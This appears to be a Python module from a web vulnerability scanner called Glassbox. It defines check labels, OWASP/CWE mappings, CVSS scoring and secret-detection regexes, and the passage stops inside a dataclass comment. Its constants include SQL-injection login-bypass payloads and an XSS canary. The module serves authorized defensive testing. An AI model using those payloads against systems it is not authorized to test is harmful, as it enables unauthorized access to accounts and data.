"""
Individual security checks for Glassbox.

Relocated verbatim from the original single-file `app.py` (Workstream 2 of
the auth/entitlement plan) — every function body below is byte-for-byte the
same logic as before the move. Only module-level plumbing needed for the
relocation itself (imports, and APP_DIR now pointing at the repo root
instead of this package directory so `reports/`/`downloads/` keep landing
in the same place on disk) was adjusted; no check's behavior changed.

Run only against domains you own or are explicitly authorized to test.
"""
import base64
import io
import ipaddress
import json
import os
import re
import socket
import ssl
import struct
import time
import zipfile
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from datetime import UTC, datetime
from urllib.parse import parse_qs, quote, urlencode, urljoin, urlparse, urlunparse
from xml.etree import ElementTree

import dns.resolver
import requests
import requests.adapters
import urllib3.connection as _urllib3_connection
import urllib3.connectionpool as _urllib3_pool
from bs4 import BeautifulSoup
from PIL import ExifTags, Image

# APP_DIR points at the repo root (one level up from this package), matching
# the original app.py's `os.path.dirname(os.path.abspath(__file__))` so
# reports/ and downloads/ keep resolving to the same on-disk location as
# before the move.
APP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
REPORTS_DIR = os.path.join(APP_DIR, "reports")
os.makedirs(REPORTS_DIR, exist_ok=True)
DOWNLOADS_DIR = os.path.join(APP_DIR, "downloads")
os.makedirs(DOWNLOADS_DIR, exist_ok=True)

REQUEST_TIMEOUT = 8
UA = "Mozilla/5.0 (Glassbox; personal-use; +local)"
CANARY_HOST = "wvs-canary-check.invalid"
XSS_MARKER = "xsscanary7f3a"
MAX_BRUTEFORCE_ATTEMPTS = 5
AUTH_BYPASS_PAYLOADS = ["' OR '1'='1' -- ", "' OR 1=1 -- ", "admin'-- "]

# Human-readable labels for run_scan()'s base-scan check units - the single
# source of truth for the live scan_events() feed (scan_routes.py) shown on
# scan_progress.html. Copied verbatim from the <summary> text already used
# for these same checks in templates/scan_report.html's "Detailed check
# output" section, so the live feed and the final report use identical
# wording for the same check. Keys must match run_scan()'s jobs-dict keys
# plus "headers"/"cookies"/"open_ports" (dispatched outside the jobs dict) -
# see entitlements.FEATURE_REQUIREMENTS's own comment for the same key-set
# convention. A key missing here isn't fatal - scan_routes.scan_events()
# falls back to `check_name.replace('_', ' ').title()`, the same fallback
# templates/scan_report.html's locked_card() macro already uses - but
# tests/test_scan_events.py asserts this stays in sync with run_scan()'s
# actual dispatchable check names, same regression-test pattern as
# entitlements.py's FEATURE_REQUIREMENTS-coverage test.
CHECK_LABELS = {
    "headers": "Security headers", "cookies": "Cookies", "tls": "TLS certificate",
    "https_redirect": "HTTP → HTTPS redirect", "sensitive_paths": "Sensitive path / file probe",
    "secrets": "Exposed API keys / secrets", "sri": "Third-party scripts/stylesheets without SRI",
    "open_ports": "Open ports", "cors": "CORS configuration", "http_methods": "HTTP methods",
    "open_redirect": "Open redirect probe", "directory_listing": "Directory listing",
    "mixed_content": "Mixed content", "dns_email": "DNS email security (SPF / DMARC / CAA)",
    "vulnerable_js": "Outdated JS libraries", "xss_sqli": "Same-origin crawl & parameter/XSS/SQLi testing",
    "robots_sitemap": "robots.txt / sitemap.xml", "jwt": "Client-visible JWT weaknesses",
    "file_upload": "File upload input detection", "privacy_exposure": "Public email/phone exposure",
    "caching_sensitive": "Cache-Control on account/auth paths",
    # Phase 20 (INTR-01..10)
    "ssti": "Server-side template injection (SSTI)", "host_header": "Host header injection",
    "cache_deception": "Web cache deception surface", "crlf": "CRLF injection",
    "csrf_posture": "CSRF token posture (forms)", "subdomain_takeover": "Subdomain takeover (DNS)",
    "path_traversal": "Path traversal probe", "rate_limit": "Rate limiting posture",
    "jwt_active": "JWT alg:none acceptance", "graphql_deep": "GraphQL deep probe",
    # Phase 33 (OWGAP-01..05)
    "xxe": "XML external entity (XXE) injection", "csp_depth": "CSP directive quality",
    "hsts_depth": "HSTS depth analysis", "dnssec": "DNSSEC signing verification",
    "dep_audit": "Dependency version audit",
    # Phase 34 (APIT-01) — graphql_depth stays in base (no credentials needed)
    "graphql_depth": "GraphQL query depth limits",
    # auth_comparison and mass_assignment moved to run_advanced_scan()
    # (APIT-02/03 need real test-account credentials — advanced-scan only)
}

# Icon-sprite key (see the <symbol id="icon-*"> sprite in templates/base.html)
# for each check unit, used by the live scan-progress feed to give each row
# a category glyph instead of forcing a fake sequential-phase narrative onto
# checks that actually run concurrently. Six categories, not seventeen
# bespoke icons, on purpose - restraint over "one icon per row" noise; keep
# this dict in sync with CHECK_LABELS (same key set) if a check is ever
# added or removed from run_scan()'s jobs dict.
CHECK_CATEGORY = {
    "headers": "shield", "cookies": "shield",
    "tls": "lock", "https_redirect": "lock", "mixed_content": "lock",
    "open_ports": "network", "cors": "network", "http_methods": "network",
    "open_redirect": "network", "directory_listing": "network",
    "sensitive_paths": "folder", "secrets": "folder", "sri": "folder", "robots_sitemap": "folder",
    "dns_email": "mail",
    "vulnerable_js": "bug", "xss_sqli": "bug", "jwt": "shield",
    "file_upload": "folder", "privacy_exposure": "mail", "caching_sensitive": "lock",
    # Phase 20 (INTR-01..10)
    "ssti": "bug", "host_header": "network", "cache_deception": "network",
    "crlf": "bug", "csrf_posture": "shield", "subdomain_takeover": "network",
    "path_traversal": "folder", "rate_limit": "lock",
    "jwt_active": "bug", "graphql_deep": "bug",
    # Phase 33 (OWGAP-01..05)
    "xxe": "bug", "csp_depth": "shield", "hsts_depth": "lock",
    "dnssec": "lock", "dep_audit": "bug",
    # Phase 34 (APIT-01) — graphql_depth stays in base
    "graphql_depth": "bug",
    # auth_comparison/mass_assignment moved to run_advanced_scan()
}

# Check names each orchestrator can dispatch, grouped by scan_type - the
# full check-name space CHECK_COMPLIANCE below must cover (unlike
# CHECK_LABELS/CHECK_CATEGORY above, which are base-scan-only). "base" is
# derived from CHECK_LABELS itself (same key set, can't drift). "api"'s
# three names are run_api_scan()'s own `results` dict sub-keys
# (scan_engine.py's check_api_schema_exposure/check_api_wordlist/
# check_api_js_discovery collection points) - deliberately NOT the single
# "api" bucket entitlements.FEATURE_REQUIREMENTS uses for route-level tier
# gating, since that single bucket would collapse "API docs/schema exposed"
# and "unauthenticated endpoint data exposed" into one indistinguishable
# compliance tag (see CHECK_COMPLIANCE's header comment below).
SCAN_TYPE_CHECK_NAMES = {
    "base": set(CHECK_LABELS),
    "advanced": {"sqli_login", "bruteforce", "sqli_union", "xss_stored", "idor",
                 "idor_sweep", "auth_comparison", "mass_assignment"},
    "media": {"media"},
    "api": {"schema", "wordlist", "js_discovery"},
}

# OWASP Top 10:2021 (+ optional OWASP ASVS 4.0.3 chapter reference) mapping
# for every check name across all 4 orchestrators (base/advanced/media/api -
# the union of SCAN_TYPE_CHECK_NAMES's values above, NOT just run_scan()'s
# jobs dict like CHECK_LABELS/CHECK_CATEGORY). `owasp` is required on every
# entry (a compliance-facing tag must always have a primary category);
# `asvs` is optional (None where it doesn't add real audit value) per D-01.
# A check_name missing from this dict degrades to the literal "Uncategorized"
# at render time rather than raising - same graceful-degradation convention
# as CHECK_LABELS's title-cased fallback and CHECK_CATEGORY's "shield"
# fallback above. Every value below is this project's own judgment mapping,
# not sourced from an authoritative external document (03-RESEARCH.md
# Assumptions Log A1/A2/A4) - keep this dict in sync with
# SCAN_TYPE_CHECK_NAMES's key-set union; tests/test_compliance.py asserts
# this stays true as checks are added/removed/renamed in any orchestrator.
CHECK_COMPLIANCE = {
    # base scan
    "headers":          {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V14.4"},
    "cookies":           {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V3.4"},
    "tls":               {"owasp": "A02:2021-Cryptographic Failures",    "asvs": "V9.1"},
    "https_redirect":    {"owasp": "A02:2021-Cryptographic Failures",    "asvs": "V9.1"},
    "sensitive_paths":   {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "robots_sitemap":    {"owasp": "Uncategorized",                      "asvs": None},
    "open_ports":        {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "cors":              {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "http_methods":      {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "open_redirect":     {"owasp": "A01:2021-Broken Access Control",     "asvs": None},
    "directory_listing": {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "mixed_content":     {"owasp": "A02:2021-Cryptographic Failures",    "asvs": None},
    "dns_email":         {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "vulnerable_js":     {"owasp": "A06:2021-Vulnerable and Outdated Components", "asvs": None},
    "xss_sqli":          {"owasp": "A03:2021-Injection",                 "asvs": "V5.3"},
    "secrets":           {"owasp": "A02:2021-Cryptographic Failures",    "asvs": "V6"},
    "sri":               {"owasp": "A08:2021-Software and Data Integrity Failures", "asvs": "V14.2"},
    "jwt":               {"owasp": "A07:2021-Identification and Authentication Failures", "asvs": "V3.5"},
    # advanced scan
    "sqli_login":        {"owasp": "A03:2021-Injection",                 "asvs": "V5.3"},
    "bruteforce":        {"owasp": "A07:2021-Identification and Authentication Failures", "asvs": "V2.2"},
    "sqli_union":        {"owasp": "A03:2021-Injection",                 "asvs": "V5.3"},
    "xss_stored":        {"owasp": "A03:2021-Injection",                 "asvs": "V5.3"},
    "idor":              {"owasp": "A01:2021-Broken Access Control",     "asvs": "V4.2"},
    "idor_sweep":        {"owasp": "A01:2021-Broken Access Control",     "asvs": "V4.2"},
    # media scan
    "media":             {"owasp": "A01:2021-Broken Access Control",     "asvs": "V8.3"},
    # api scan (matches run_api_scan()'s own `results` dict sub-keys, not
    # entitlements.FEATURE_REQUIREMENTS's single "api" tier-gating bucket)
    "schema":            {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V13"},
    "wordlist":          {"owasp": "A01:2021-Broken Access Control",     "asvs": "V13"},
    "js_discovery":      {"owasp": "A01:2021-Broken Access Control",     "asvs": "V13"},
    # v1.3 Phase 14 net-new base-scan checks
    "file_upload":       {"owasp": "A04:2021-Insecure Design",           "asvs": "V12.4"},
    "privacy_exposure":  {"owasp": "A01:2021-Broken Access Control",     "asvs": None},
    "caching_sensitive": {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V8.1"},
    # v1.5 Phase 20 intrusive coverage (INTR-01..10)
    "ssti":              {"owasp": "A03:2021-Injection",                 "asvs": "V5.3"},
    "host_header":       {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "cache_deception":   {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "crlf":              {"owasp": "A03:2021-Injection",                 "asvs": "V5.3"},
    "csrf_posture":      {"owasp": "A01:2021-Broken Access Control",     "asvs": "V3.7"},
    "subdomain_takeover": {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "path_traversal":    {"owasp": "A01:2021-Broken Access Control",     "asvs": "V12.6"},
    "rate_limit":        {"owasp": "A07:2021-Identification and Authentication Failures", "asvs": "V2.5"},
    "jwt_active":        {"owasp": "A07:2021-Identification and Authentication Failures", "asvs": "V3.5"},
    "graphql_deep":      {"owasp": "A01:2021-Broken Access Control",     "asvs": "V13"},
    # Phase 33 (OWGAP-01..05)
    "xxe":               {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V5.3"},
    "csp_depth":         {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V14.4"},
    "hsts_depth":        {"owasp": "A05:2021-Security Misconfiguration", "asvs": "V14.4"},
    "dnssec":            {"owasp": "A05:2021-Security Misconfiguration", "asvs": None},
    "dep_audit":         {"owasp": "A06:2021-Vulnerable and Outdated Components", "asvs": None},
    # Phase 34 (APIT-01..03)
    "graphql_depth":     {"owasp": "A01:2021-Broken Access Control",     "asvs": "V13"},
    "auth_comparison":   {"owasp": "A01:2021-Broken Access Control",     "asvs": "V4.2"},
    "mass_assignment":   {"owasp": "A04:2021-Insecure Design",           "asvs": "V5.3"},
}

# CWE mapping, parallel to CHECK_COMPLIANCE above and kept in sync with it
# by a coverage test (tests/test_cwe_mapping.py), exactly like CHECK_LABELS
# and CHECK_CATEGORY.
#
# Why this exists: `Finding.cwe` has been a field since v1.3 but NO built-in
# check ever populated it - only community_checks.py, from YAML. That left
# three already-written code paths permanently dead: sarif.py's `cwe:<id>`
# tagging (which is what makes GitHub Code Scanning group and explain a
# finding), ndjson_report.py's exported `cwe` column, and the `cwe` field
# the API reference advertises. All three emitted null forever.
#
# One CWE per check, chosen as the *most specific* weakness the check
# actually proves - not the broadest plausible parent. Where a check spans
# genuinely different weaknesses the entry stays None rather than asserting
# a wrong ID: a precise-looking but incorrect CWE is worse than an absent
# one in a client deliverable, because it survives into compliance mapping
# unchallenged.
CHECK_CWE = {
    # --- base scan: configuration & transport ---
    "headers":            "CWE-693",   # Protection Mechanism Failure
    "cookies":            "CWE-614",   # Sensitive Cookie Without 'Secure'
    "tls":                "CWE-326",   # Inadequate Encryption Strength
    "https_redirect":     "CWE-319",   # Cleartext Transmission
    "hsts_depth":         "CWE-319",
    "mixed_content":      "CWE-319",
    "csp_depth":          "CWE-1021",  # Improper Restriction of Rendered UI Layers
    "host_header":        "CWE-644",   # Improper Neutralization of HTTP Headers
    "cache_deception":    "CWE-525",   # Use of Web Browser Cache Containing Sensitive Info
    "caching_sensitive":  "CWE-524",   # Use of Cache Containing Sensitive Information
    "dns_email":          "CWE-290",   # Authentication Bypass by Spoofing
    "dnssec":             "CWE-350",   # Reliance on Reverse DNS Resolution
    "subdomain_takeover": "CWE-350",

    # --- exposure / information disclosure ---
    "sensitive_paths":    "CWE-200",   # Exposure of Sensitive Information
    "directory_listing":  "CWE-548",   # Exposure of Information Through Directory Listing
    "secrets":            "CWE-798",   # Use of Hard-coded Credentials
    "privacy_exposure":   "CWE-359",   # Exposure of Private Personal Information
    "media":              "CWE-200",
    "open_ports":         "CWE-668",   # Exposure of Resource to Wrong Sphere
    "schema":             "CWE-200",
    "wordlist":           "CWE-200",
    "js_discovery":       "CWE-200",
    # robots.txt/sitemap findings are informational wayfinding, not a
    # weakness in their own right - CHECK_COMPLIANCE calls this
    # "Uncategorized" for the same reason.
    "robots_sitemap":     None,

    # --- injection ---
    "xss_sqli":           "CWE-79",    # Cross-site Scripting
    "xss_stored":         "CWE-79",
    "sqli_login":         "CWE-89",    # SQL Injection
    "sqli_union":         "CWE-89",
    "crlf":               "CWE-93",    # CRLF Injection
    "ssti":               "CWE-1336",  # Server-Side Template Injection
    "xxe":                "CWE-611",   # Improper Restriction of XML External Entity
    "path_traversal":     "CWE-22",    # Path Traversal

    # --- access control ---
    "idor":               "CWE-639",   # Authorization Bypass Through User-Controlled Key
    "idor_sweep":         "CWE-639",   # same weakness, discovery-driven
    "open_redirect":      "CWE-601",   # URL Redirection to Untrusted Site
    "cors":               "CWE-942",   # Permissive Cross-domain Policy
    "csrf_posture":       "CWE-352",   # Cross-Site Request Forgery
    "http_methods":       "CWE-650",   # Trusting HTTP Permission Methods on the Server Side
    "mass_assignment":    "CWE-915",   # Improperly Controlled Modification of Attributes
    "auth_comparison":    "CWE-285",   # Improper Authorization
    "graphql_depth":      "CWE-770",   # Allocation Without Limits (depth/complexity abuse)
    "graphql_deep":       "CWE-770",
    "file_upload":        "CWE-434",   # Unrestricted Upload of File with Dangerous Type

    # --- authentication / session ---
    "bruteforce":         "CWE-307",   # Improper Restriction of Excessive Auth Attempts
    "rate_limit":         "CWE-770",
    "jwt":                "CWE-347",   # Improper Verification of Cryptographic Signature
    "jwt_active":         "CWE-347",

    # --- components ---
    "vulnerable_js":      "CWE-1395",  # Dependency on Vulnerable Third-Party Component
    "dep_audit":          "CWE-1395",
    "sri":                "CWE-353",   # Missing Support for Integrity Check
}


def apply_cwe_mapping(findings):
    """Backfill ``Finding.cwe`` from ``CHECK_CWE`` keyed on ``check_name``.

    Called once per orchestrator, immediately before deduplication, for the
    same reason ``check_name`` itself is assigned centrally: threading a CWE
    through all 89 ``Finding(...)`` construction sites would guarantee drift.

    Never overwrites a CWE that is already set - ``community_checks.py``
    populates ``cwe`` from each YAML check's own definition, and that
    author-supplied value is more specific than anything this map could
    infer from a check name. An unmapped ``check_name`` is left as-is
    rather than guessed at; the coverage test is what keeps the map
    complete.
    """
    for f in findings:
        if getattr(f, "cwe", None):
            continue
        mapped = CHECK_CWE.get(getattr(f, "check_name", "") or "")
        if mapped:
            f.cwe = mapped
    return findings

# v1.3 SCORE-01: groups every check_name into one of the 11 product-facing
# finding domains the scan report displays (parallel to CHECK_COMPLIANCE
# above - same coverage-lock pattern, see tests/test_security_domains.py).
# "Security Posture" and "Production Readiness" are deliberately NOT values
# here - those are the report's aggregate summary/verdict sections, not
# domains any single check's findings belong to.
#
# This is this project's own judgment mapping (same caveat CHECK_COMPLIANCE
# already carries), not sourced from an authoritative taxonomy. A few checks
# span domains and needed a call: xss_sqli/sqli_union/xss_stored/sri/
# mixed_content are grouped under Client Security (the browser-facing half
# of what they test) rather than splitting each into its own bucket;
# cors/schema/wordlist/js_discovery all go to API Security since every one
# of them probes the API/cross-origin surface specifically, distinct from
# Configuration's general response/header hardening checks.
SECURITY_DOMAIN_MAP = {
    # base scan
    "headers":           "Configuration",
    "cookies":           "Configuration",
    "tls":               "TLS",
    "https_redirect":    "TLS",
    "sensitive_paths":   "Attack Surface",
    "robots_sitemap":    "Attack Surface",
    "open_ports":        "Attack Surface",
    "cors":              "API Security",
    "http_methods":      "Configuration",
    "open_redirect":     "Configuration",
    "directory_listing": "Configuration",
    "mixed_content":     "Client Security",
    "dns_email":         "DNS & Domains",
    "vulnerable_js":     "Dependencies",
    "xss_sqli":          "Client Security",
    "secrets":           "Secrets",
    "sri":               "Client Security",
    "jwt":               "Authentication",
    # advanced scan
    "sqli_login":        "Authentication",
    "bruteforce":        "Authentication",
    "sqli_union":        "Client Security",
    "xss_stored":        "Client Security",
    "idor":              "Authorization",
    # media scan
    "media":             "Privacy",
    # api scan
    "schema":            "API Security",
    "wordlist":          "API Security",
    "js_discovery":      "API Security",
    # v1.3 Phase 14 net-new base-scan checks
    "file_upload":       "Configuration",
    "privacy_exposure":  "Privacy",
    "caching_sensitive": "Configuration",
    # v1.5 Phase 20 intrusive coverage (INTR-01..10)
    "ssti":              "Client Security",
    "host_header":       "Configuration",
    "cache_deception":   "Configuration",
    "crlf":              "Client Security",
    "csrf_posture":      "Authorization",
    "subdomain_takeover": "DNS & Domains",
    "path_traversal":    "Attack Surface",
    "rate_limit":        "Authentication",
    "jwt_active":        "Authentication",
    "graphql_deep":      "API Security",
    # Phase 33 (OWGAP-01..05)
    "xxe":               "Client Security",
    "csp_depth":         "Client Security",
    "hsts_depth":        "TLS",
    "dnssec":            "DNS & Domains",
    "dep_audit":         "Dependencies",
    # Phase 34 (APIT-01..03)
    "graphql_depth":     "API Security",
    "auth_comparison":   "Authorization",
    "mass_assignment":   "Configuration",
}

# The 11 real finding-groups a check_name can map to, plus the two
# aggregate-only sections a report can show (never a check_name's target).
SECURITY_DOMAINS = (
    "Attack Surface", "Authentication", "Authorization", "API Security",
    "Client Security", "Configuration", "Secrets", "DNS & Domains", "TLS",
    "Dependencies", "Privacy",
)
SECURITY_POSTURE_SECTIONS = ("Security Posture", "Production Readiness")


def security_domain_for(check_name):
    """Mirrors owasp_category_for()'s degrade-gracefully convention - a
    check_name missing from SECURITY_DOMAIN_MAP falls back to
    "Uncategorized" at render time instead of raising."""
    return SECURITY_DOMAIN_MAP.get(check_name, "Uncategorized")

# (label, regex, severity). High-confidence formats (AWS/Stripe/GitHub/private
# keys) are critical/high; ambiguous generic patterns are medium to keep the
# false-positive rate manageable; publishable keys/JWTs are info since those
# are often meant to be client-visible by design.
SECRET_PATTERNS = [
    ("AWS Access Key ID", r"AKIA[0-9A-Z]{16}", "critical"),
    ("AWS Secret Access Key", r"(?i)aws_secret_access_key[\"'\s:=]+([A-Za-z0-9/+=]{40})", "critical"),
    ("Private key block", r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "critical"),
    ("Stripe live secret key", r"sk_live_[0-9a-zA-Z]{20,}", "critical"),
    ("Stripe live restricted key", r"rk_live_[0-9a-zA-Z]{20,}", "critical"),
    ("GitHub personal access token", r"ghp_[0-9A-Za-z]{36}", "critical"),
    ("GitHub fine-grained token", r"github_pat_[0-9A-Za-z_]{20,}", "critical"),
    ("Slack token", r"xox[baprs]-[0-9A-Za-z-]{10,}", "critical"),
    ("Google API key", r"AIza[0-9A-Za-z\-_]{35}", "high"),
    ("Generic secret-looking assignment",
     r"(?i)(?:api[_-]?key|secret|access[_-]?token)[\"'\s]*[:=][\"'\s]*([A-Za-z0-9\-_]{20,})", "medium"),
    ("Stripe publishable key", r"pk_live_[0-9a-zA-Z]{20,}", "info"),
    ("JWT-looking token", r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}", "info"),
]
MAX_SECRET_JS_FILES = 12
MAX_JS_BYTES_PER_FILE = 300_000

MEDIA_PATH_HINTS = ["private", "backup", "internal", "staging", "confidential", "draft",
                     "unlisted", "hidden", "tmp", "temp", "archive", "unpublished", "raw", "old"]
MAX_MEDIA_PAGES = 6
MAX_MEDIA_ITEMS = 60
MAX_EXIF_IMAGES = 15
MAX_MEDIA_FILE_BYTES = 20 * 1024 * 1024
MAX_MEDIA_DOCUMENTS = 15
MAX_VIDEO_METADATA_FILES = 15

# API exposure checks (see check_api_schema_exposure / check_api_wordlist /
# check_api_js_discovery). Ported from the api-exposure-media-streaming
# branch's pre-cutover app.py into this package for the dedicated
# /scan/new/api page - runs as its own scan_type ("api"), separate from the
# base scan.
API_SCHEMA_PATHS = ["swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
                     "api-docs", "v2/api-docs", "v3/api-docs", "graphiql", "api/swagger.json"]
GRAPHQL_PATHS = ["graphql", "api/graphql", "v1/graphql"]
GRAPHQL_INTROSPECTION_QUERY = {"query": "{__schema{types{name}}}"}
API_SCHEMA_SIGNATURES = ('"openapi"', '"swagger"', '"paths"', "<title>swagger", "graphiql")

API_WORDLIST = ["api", "api/v1", "api/v2", "api/admin", "api/internal", "api/users",
                 "api/user", "api/config", "api/orders", "api/auth", "api/debug",
                 "api/backup", "api/token", "api/keys", "api/accounts", "api/payments",
                 "api/health", "api/status", "api/logs", "api/test"]
API_SENSITIVE_HINTS = ["admin", "internal", "config", "debug", "backup", "token",
                        "secret", "payment", "key", "credential"]
MAX_API_JS_ENDPOINTS = 30

# --------------------------------------------------------------------------
# Findings model - every check appends a Finding so the report can show one
# consistent, severity-ranked summary instead of N differently shaped tables.
# --------------------------------------------------------------------------
SEVERITY_WEIGHT = {"critical": 25, "high": 15, "medium": 7, "low": 3, "info": 0}
SEVERITY_ORDER = ["critical", "high", "medium", "low", "info", "pass"]

# Phase 29 (SARIF-02): the ONE severity -> SARIF `level` mapping, shared by
# every SARIF exporter (session-web /scan/<id>/report.sarif and the
# token-authed /api/v1 twin both render through sarif.build_sarif_report,
# which is the only caller today - the function lives here beside the
# severity vocabulary it translates rather than in sarif.py so a future
# exporter can't grow its own private copy). Mapping per ROADMAP Phase 29:
# critical/high -> "error", medium -> "warning", low/info -> "note";
# "pass" findings are not problems at all -> "none" (a valid SARIF level).
# Unknown severities degrade to "note" (visible-but-informational) rather
# than raising - same degrade-gracefully convention as owasp_category_for.
SARIF_SEVERITY_LEVEL = {
    "critical": "error",
    "high": "error",
    "medium": "warning",
    "low": "note",
    "info": "note",
    "pass": "none",
}


def severity_to_sarif_level(severity):
    return SARIF_SEVERITY_LEVEL.get(str(severity or "").lower(), "note")


# --------------------------------------------------------------------------
# CVSS 3.1 base score computation (CVSS-02).
#
# Parses a CVSS:3.1 vector string and returns (base_score, severity_label)
# per the FIRST CVSS v3.1 specification.  Only the Base metric group is
# required for scoring; Temporal and Environmental metrics are parsed but
# the base score formula ignores them (per spec — Temporal/Environment
# modify the score via their own formulas, but we only use the base for
# the severity label).
#
# Invalid or unparseable vectors degrade to (0.0, "None") — never raise.
# --------------------------------------------------------------------------

_CVSS_AV = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20}
_CVSS_AC = {"L": 0.77, "H": 0.44}
_CVSS_PR_FALSE = {"N": 0.85, "L": 0.62, "H": 0.27}
_CVSS_PR_TRUE = {"N": 0.85, "L": 0.68, "H": 0.50}
_CVSS_UI = {"N": 0.85, "R": 0.62}
_CVSS_IMPACT = {"N": 0.00, "L": 0.22, "H": 0.56}
_CVSS_IMPACT_WEIGHT = {"N": 0.0, "L": 0.22, "H": 0.56}


def compute_cvss_score(vector):
    """Parse a CVSS 3.1 vector string and return (base_score, severity_label).

    Returns (0.0, "None") for invalid/unparseable vectors — never raises.
    Uses the CVSS 3.1 specification's Roundup function (always one decimal).
    """
    import re

    def _roundup(val):
        """CVSS 3.1 Roundup: round up to one decimal place."""
        int_part = int(val * 10)
        if val * 10 == int_part:
            return float(int_part) / 10
        return (int_part + 1) / 10.0

    if not vector or not isinstance(vector, str):
        return 0.0, "None"

    m = re.match(r"^CVSS:3\.[01]/(.+)$", vector.strip())
    if not m:
        return 0.0, "None"

    metrics = {}
    for part in m.group(1).split("/"):
        kv = part.split(":", 1)
        if len(kv) == 2:
            metrics[kv[0]] = kv[1]

    try:
        av = _CVSS_AV[metrics["AV"]]
        ac = _CVSS_AC[metrics["AC"]]
        ui = _CVSS_UI[metrics["UI"]]

        cia_values = [metrics.get(k, "N") for k in ("C", "I", "A")]
        iss = 1.0 - ((1.0 - _CVSS_IMPACT.get(cia_values[0], 0.0))
                     * (1.0 - _CVSS_IMPACT.get(cia_values[1], 0.0))
                     * (1.0 - _CVSS_IMPACT.get(cia_values[2], 0.0)))
        impact_sub = 6.42 * iss

        if impact_sub <= 0:
            return 0.0, "None"

        pr_table = _CVSS_PR_TRUE if "C" in cia_values or "H" in cia_values else _CVSS_PR_FALSE
        pr = pr_table.get(metrics.get("PR", "N"), 0.85)

        exploitability = 8.22 * av * ac * pr * ui

        raw = min(impact_sub + exploitability, 10.0)
        score = _roundup(raw)

        if score >= 9.0:
            label = "Critical"
        elif score >= 7.0:
            label = "High"
        elif score >= 4.0:
            label = "Medium"
        else:
            label = "Low"

        return score, label
    except (KeyError, ValueError):
        return 0.0, "None"

# Maps each Finding.category string (the values passed as Finding(...)'s
# first positional arg, verified against every call site in this file) to
# an OWASP Top 10 (2021) category, purely for report grouping/filtering -
# this is a presentation-layer lookup, not a new stored field on Finding
# itself, so adding a check never requires touching Finding's call sites.
# A category missing here falls back to "Uncategorized" (see
# owasp_category_for below) rather than raising, same degrade-gracefully
# convention as CHECK_LABELS/CHECK_CATEGORY.
OWASP_CATEGORY_MAP = {
    "Headers": "A05:2021 - Security Misconfiguration",
    "Cookies": "A05:2021 - Security Misconfiguration",
    "TLS": "A02:2021 - Cryptographic Failures",
    "Transport": "A02:2021 - Cryptographic Failures",
    "CORS": "A05:2021 - Security Misconfiguration",
    "HTTP methods": "A05:2021 - Security Misconfiguration",
    "Open redirect": "A01:2021 - Broken Access Control",
    "Mixed content": "A02:2021 - Cryptographic Failures",
    "DNS/Email": "A05:2021 - Security Misconfiguration",
    "Dependencies": "A06:2021 - Vulnerable and Outdated Components",
    "Supply chain": "A08:2021 - Software and Data Integrity Failures",
    "Secrets": "A02:2021 - Cryptographic Failures",
    "Exposure": "A01:2021 - Broken Access Control",
    "Sensitive Path Exposure": "A01:2021 - Broken Access Control",
    "Media exposure": "A01:2021 - Broken Access Control",
    "XSS": "A03:2021 - Injection",
    "SQL Injection": "A03:2021 - Injection",
    "Auth": "A07:2021 - Identification and Authentication Failures",
    "IDOR": "A01:2021 - Broken Access Control",
}


def owasp_category_for(category):
    return OWASP_CATEGORY_MAP.get(category, "Uncategorized")


# v1.3 FSCH-01: how certain the check's own author is that this specific
# finding is real, kept strictly separate from `severity` (how bad it would
# be if true). A pattern/heuristic match that could have edge-case false
# positives is never "Confirmed" just because it would be severe if real -
# see 12-CONTEXT.md / REQUIREMENTS.md's explicit rule: never call something
# Confirmed without a direct, causal proof (a canary executed, a value
# directly parsed/observed, a real successful auth, actual extracted data).
CONFIDENCE_LEVELS = (
    "Confirmed",                # direct, causal proof - no interpretation required
    "Strong Evidence",          # a reliable heuristic/pattern match, small false-positive surface
    "Potential",                # plausible but the check's own logic says "unconfirmed"/"possible"
    "Informational",            # not a security claim at all (a policy note, a benign absence)
    "Not Externally Verifiable",  # the check itself could not complete/observe enough to judge
)

# v1.3 SCORE-03/SCORE-04: how much a finding's confidence should count
# toward the production-readiness verdict (scan_engine._compute_readiness) -
# a separate signal from the numeric risk score (scan_engine._score_report),
# which stays untouched/severity-only (see that function's own docstring and
# its source-parsing regression lock in tests/test_scan_engine.py - 20+
# existing tests depend on its exact arithmetic, so this milestone extends
# scoring via a companion signal instead of risking that lock). Informational
# findings never gate readiness; Confirmed/Strong Evidence findings always
# do; Potential/Not Externally Verifiable findings are visible but don't
# alone block a READY verdict.
READINESS_GATING_CONFIDENCE = {"Confirmed", "Strong Evidence"}


@dataclass
class Finding:
    category: str
    title: str
    severity: str  # critical | high | medium | low | info | pass
    detail: str
    recommendation: str = ""
    # Which check produced this finding (e.g. "headers", "sqli_login"). Left
    # unset (default "") at all ~50 Finding(...) construction sites in this
    # file - it is assigned centrally, once per check, by each of the 4
    # scan_engine.py orchestrators at the point they collect that check's
    # (data, findings) return value. See CHECK_COMPLIANCE below, which is
    # keyed on this same string.
    check_name: str = ""
    # v1.3 FSCH-01/02/03. `confidence` is required in substance - every real
    # Finding(...) call site in this file passes it explicitly (see
    # tests/test_finding_confidence.py's coverage lock) - the class-level
    # default below exists only so ad-hoc Finding(...) construction outside
    # this file (tests, REPL) doesn't need to supply every field. `cwe` is
    # optional and populated only where a check genuinely maps to one
    # specific CWE, never filled in speculatively just to have a value.
    # `verification_state` is optional, used primarily by attack-surface/
